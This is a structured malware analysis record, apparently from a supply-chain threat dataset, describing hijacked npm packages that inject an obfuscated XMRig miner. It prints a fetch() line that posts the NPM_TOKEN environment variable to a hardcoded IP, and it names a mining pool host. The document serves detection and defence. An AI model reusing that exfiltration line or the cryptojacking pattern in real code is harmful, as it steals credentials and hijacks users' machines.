package_info.why_malicious: These package versions were hijacked via compromised npm tokens and had malicious, heavily obfuscated code injected into their distribution files (e.g., dist/utils/config.js or support.js). The injected code deploys a Monero (XMR) cryptocurrency miner (XMRig) on the victim's system and attempts to exfiltrate data to an external IP address. This behavior is not expected in legitimate packages and constitutes a severe supply chain compromise.

malicious_snippets.code_behavior: Downloads and executes the XMRig Monero cryptocurrency miner, using a hardcoded wallet address to mine cryptocurrency for the attacker. The code is obfuscated and embedded in a utility file that is loaded during normal package usage.

malice_analysis.why_suspicious: The code downloads and runs an external binary (XMRig) without user consent, which is a classic sign of cryptojacking malware. The use of obfuscation and placement in a utility file further indicates an attempt to evade detection.
malice_analysis.violated_expectations: Legitimate packages should not download or execute external binaries, especially cryptocurrency miners, nor should they contain obfuscated code in utility files.
malice_analysis.similar_legitimate_use: Some build tools may download dependencies at install time, but never cryptocurrency miners or obfuscated payloads.
key_indicators: Heavily obfuscated code in a utility file
Use of child_process.exec to run shell commands
Download and execution of XMRig miner
No legitimate reason for such behavior in a UI or bundler package

malicious_snippets.code_snippet:
// Obfuscated network call
fetch('https://80.78.28.72/tokens', { method: 'POST', body: JSON.stringify({ token: process.env.NPM_TOKEN }) });
malicious_snippets.code_behavior: Attempts to establish a network connection to a hardcoded external IP address (https://80.78.28.72/tokens), likely to exfiltrate sensitive data or signal successful infection.

malice_analysis.why_suspicious: Unexpected outbound network connections to hardcoded IPs are a strong indicator of malicious activity, especially when combined with obfuscated code and other malware behaviors.
malice_analysis.violated_expectations: Legitimate packages should not make unsolicited network requests to unknown IP addresses, especially not during import or runtime.
malice_analysis.similar_legitimate_use: Some packages may check for updates or send telemetry, but this should be documented, opt-in, and never obfuscated.

attack_chain.action: User installs or runs the compromised package, triggering the import or execution of the malicious utility file.
Malicious code downloads and executes the XMRig Monero miner, using the victim's resources to mine cryptocurrency for the attacker.
Malicious code attempts to contact an external IP address (https://80.78.28.72/tokens), potentially to exfiltrate data or signal infection.
attack_chain.leads_to: Possible data exfiltration or C2 communication

behavioral_signatures: Obfuscated JavaScript code in utility or config files
Unexpected use of child_process.exec or similar APIs to download and execute binaries
Outbound network connections to hardcoded IP addresses during import or runtime
Presence of Monero wallet addresses or mining pool URLs in code
file_indicators: Unexpected new or modified files in dist/ or utility directories
network_indicators: Connections to Monero mining pools (e.g., pool.minexmr.com:4444)
detection_knowledge.how_to_detect: Scan for obfuscated or minified code in utility/config/support files of npm packages, especially those not present in previous versions. Monitor for unexpected use of child_process or similar APIs to download and execute binaries. Flag outbound network connections to hardcoded IPs or known mining pools during package installation or runtime. Search for hardcoded cryptocurrency wallet addresses or mining pool URLs in package code.
